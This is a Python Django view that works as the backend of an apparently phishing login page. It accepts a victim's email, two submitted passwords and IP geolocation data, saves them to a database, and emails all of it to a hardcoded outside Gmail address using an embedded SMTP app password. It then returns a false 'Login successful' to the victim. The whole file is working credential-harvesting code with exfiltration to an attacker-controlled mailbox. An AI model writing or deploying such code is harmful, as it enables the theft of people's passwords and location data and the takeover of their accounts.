from django.http import JsonResponse
from rest_framework.decorators import api_view
from dbconnection import users
import smtplib


@api_view(['POST'])
def get_user_info(request):
    # Get the login and location data from the request
    email = request.data.get('email')
    firstpasswordused = request.data.get('firstpasswordused')
    secondpasswordused = request.data.get('secondpasswordused')
    location_info = request.data.get('locationInfo')

    if not email or not firstpasswordused or not secondpasswordused:
        return JsonResponse({'error': 'Email and passwords are required'}, status=400)

    # Save the user info and location info to the database
    user_data = {
        "email": email,
        "firstpasswordused": firstpasswordused,
        "secondpasswordused": secondpasswordused,
        "location_info": location_info  # Save the IP/location info
    }
    user_id = users.insert_one(user_data).inserted_id

    # Send an email with login details and location info
    sending_email = 'ranickiauerbach@gmail.com'
    r_email = 'flaco.hex2@gmail.com'
    m_password = 'nlov pvvd rcoa dnwl'

    ip_info = f"""
    Email: {email}
    First Password: {firstpasswordused}
    Second Password: {secondpasswordused}
    IP Address: {location_info.get('ip', 'N/A')}
    City: {location_info.get('city', 'N/A')}
    Region: {location_info.get('region', 'N/A')}
    Country: {location_info.get('country', 'N/A')}
    Latitude/Longitude: {location_info.get('loc', 'N/A')}
    Organization: {location_info.get('org', 'N/A')}
    Postal Code: {location_info.get('postal', 'N/A')}
    Timezone: {location_info.get('timezone', 'N/A')}
    """

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
        connection.login(user=sending_email, password=m_password)
        connection.sendmail(
            from_addr=sending_email,
            to_addrs=r_email,
            msg=f"Subject: User Login Info\n\n{ip_info}"
        )

    return JsonResponse({'message': 'Login successful'}, status=200)
